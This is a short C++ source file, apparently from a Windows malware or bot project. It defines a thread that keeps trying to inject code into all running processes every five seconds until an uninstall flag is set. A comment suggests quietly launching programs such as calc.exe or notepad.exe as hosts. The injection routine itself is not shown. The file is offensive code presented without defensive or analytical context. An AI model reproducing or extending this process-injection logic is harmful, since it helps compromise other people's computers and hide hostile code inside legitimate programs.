#include "../Includes/includes.h"

#ifdef INCLUDE_INJECTION
DWORD WINAPI InfiniteInjectAllProcesses(LPVOID)
{
    int nCycles = 0;
    while(!bUninstallProgram)
    {
        int nInjectedProcesses = InjectAllProcesses();

        if((nInjectedProcesses == 0 && nCycles == 0) || nInjectedProcesses == -1)
        {
            //maybe execute something like iexplore.exe, calc.exe, notepad.exe, etc hidden
        }

        nCycles++;
        Sleep(5000);
    }

    return 1;
}

void StartInjectedThreads()
{
    while(!bUninstallProgram)
    {
        HANDLE hThread = CreateThread(NULL, NULL, InfiniteInjectAllProcesses, NULL, NULL, NULL);
        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        CloseHandle(hThread);

        Sleep(500);
    }
}
#endif
